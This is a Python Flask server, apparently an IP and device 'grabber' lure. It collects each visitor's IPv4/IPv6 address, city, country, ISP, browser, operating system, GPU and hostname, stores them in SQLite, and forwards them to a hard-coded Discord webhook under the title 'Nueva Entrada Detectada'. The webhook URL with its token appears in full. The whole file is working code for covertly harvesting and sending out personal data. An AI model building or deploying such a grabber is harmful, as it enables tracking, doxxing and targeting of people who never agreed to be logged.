from flask import Flask, render_template, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from datetime import datetime, timezone
import requests 

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///datos.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

class Registro(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    ipv4 = db.Column(db.String(50))
    ipv6 = db.Column(db.String(50))
    region = db.Column(db.String(100))
    pais = db.Column(db.String(100))
    ciudad = db.Column(db.String(100))
    isp = db.Column(db.String(150))
    navegador = db.Column(db.String(100))
    user_agent = db.Column(db.String(300))
    sistema = db.Column(db.String(100))
    gpu = db.Column(db.String(200))
    hostname = db.Column(db.String(100))
    timestamp = db.Column(db.DateTime, default=lambda: datetime.now(timezone.utc))

with app.app_context():
    db.create_all()

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/enviar', methods=['POST'])
def enviar():
    data = request.json

    nuevo = Registro(
        ipv4=data.get('ipv4'),
        ipv6=data.get('ipv6'),
        region=data.get('region'),
        pais=data.get('pais'),
        ciudad=data.get('ciudad'),
        isp=data.get('isp'),
        navegador=data.get('navegador'),
        user_agent=data.get('user_agent'),
        sistema=data.get('sistema'),
        gpu=data.get('gpu'),
        hostname=data.get('hostname')
    )
    db.session.add(nuevo)
    db.session.commit()

    # ========== CONFIGURACIÓN ==========
    WEBHOOK_URL = "https://discord.com/api/webhooks/1533636926358425801/vjbh3MBCTlK42UzWOACnQfusHVfM0jWTS-XVLRkHWNjctvSXtJP9qeCwdA6600LysicQ"  # ← CAMBIA ESTO
    # ===================================
   
    try:
        requests.post(
            WEBHOOK_URL,
            json={
                "embeds": [{
                    "title": "🎮 Nueva Entrada Detectada",
                    "color": 0x1b2838,
                    "fields": [
                        {"name": "(+) IPv4", "value": data.get('ipv4', 'N/A'), "inline": True},
                        {"name": "(+) IPv6", "value": data.get('ipv6', 'N/A'), "inline": True},
                        {"name": "(+) Región", "value": data.get('region', 'N/A'), "inline": True},
                        {"name": "(+) País", "value": data.get('pais', 'N/A'), "inline": True},
                        {"name": "(+) Ciudad", "value": data.get('ciudad', 'N/A'), "inline": True},
                        {"name": "(+) ISP", "value": data.get('isp', 'N/A'), "inline": True},
                        {"name": "(+) Navegador", "value": data.get('navegador', 'N/A'), "inline": True},
                        {"name": "(+) Sistema", "value": data.get('sistema', 'N/A'), "inline": True},
                        {"name": "(+) GPU", "value": data.get('gpu', 'No detectada'), "inline": False},
                        {"name": "(+) Hostname", "value": data.get('hostname', 'N/A'), "inline": True},
                        {"name": "(+) User Agent", "value": data.get('user_agent', 'N/A'), "inline": False},
                        {"name": "(+) ID Registro", "value": str(nuevo.id), "inline": True}
                    ],
                    "timestamp": datetime.now(timezone.utc).isoformat()
                }]
            },
            timeout=10
        )
    except Exception as e:
        print("Error webhook:", str(e))
    
    
    return jsonify({"status": "success"})

if __name__ == '__main__':
    app.run(debug=True)